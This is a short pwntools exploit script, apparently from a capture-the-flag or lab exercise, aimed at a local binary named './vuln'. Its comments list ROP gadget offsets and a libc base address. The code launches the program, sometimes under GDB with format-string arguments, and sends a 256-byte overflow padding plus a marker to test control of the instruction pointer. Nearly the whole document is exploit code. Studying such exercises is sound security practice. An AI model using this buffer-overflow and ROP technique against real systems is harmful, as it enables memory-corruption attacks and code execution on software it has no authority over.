#!/usr/bin/env python3

#############################################
# 0x0003b4fc: pop edx; ret;
# 0xffffffff
# 0x000915a3: pop ecx; ret;
# 0x01010101
# 0x00184049: pop ebx; ret;
# 0xfffdcfff
# 0x0003677d: inc ebx; ret; 
# libc_base = 0xf7d75000

from pwn import *

exe = context.binary = ELF(args.EXE or './vuln')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path, "%p:%p:%p:%p:%p:"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

p = start()

print(p.recvline())

p.sendline(b'A'*256 + b'BBBB')

p.interactive()
